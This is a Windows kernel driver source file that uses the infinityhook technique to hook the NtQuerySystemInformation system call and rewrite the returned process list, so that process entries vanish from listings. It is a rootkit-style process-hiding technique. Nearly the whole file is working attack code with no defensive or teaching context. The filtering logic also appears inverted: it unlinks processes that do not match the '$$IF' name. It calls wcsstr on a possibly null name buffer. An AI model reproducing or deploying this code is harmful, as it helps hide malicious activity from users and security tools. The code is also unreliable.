#include "stdafx.h"
#include "entry.h"
#include "infinityhook.h"

static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, IN OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT _Out_opt_ PULONG ReturnLength);
NtQuerySystemInformation_t OrigNtQuerySystemInformation = NULL;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFORMATION;

NTSTATUS DetourQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCurr = NULL, pNext = NULL;

	status = OrigNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCurr = NULL;
		pNext = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (pNext->NextEntryOffset != 0)
		{
			pCurr = pNext;
			pNext = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurr + pCurr->NextEntryOffset);

			if (wcsstr(pNext->ImageName.Buffer, L"$$IF"))
			{
				if (pNext->NextEntryOffset == 0)
				{
					pCurr->NextEntryOffset = 0;
				}
			}
			else
			{
				pCurr->NextEntryOffset += pNext->NextEntryOffset;
			}
			pNext = pCurr;
		}
	}
	return status;
}

void __fastcall SyscallStub(
	_In_ unsigned int SystemCallIndex,
	_Inout_ void** SystemCallFunction)
{
	UNREFERENCED_PARAMETER(SystemCallIndex);
	if (*SystemCallFunction == OrigNtQuerySystemInformation)
	{
		*SystemCallFunction = DetourQuerySystemInformation;
	}
}

extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	kprintf("[+] infinityhook: Loaded.\n");

	DriverObject->DriverUnload = DriverUnload;

	OrigNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);

	NTSTATUS Status = IfhInitialize(SyscallStub);
	if (!NT_SUCCESS(Status))
	{
		kprintf("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
	}
	return Status;
}

void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	IfhRelease();

	kprintf("\n[!] infinityhook: Unloading... BYE!\n");
}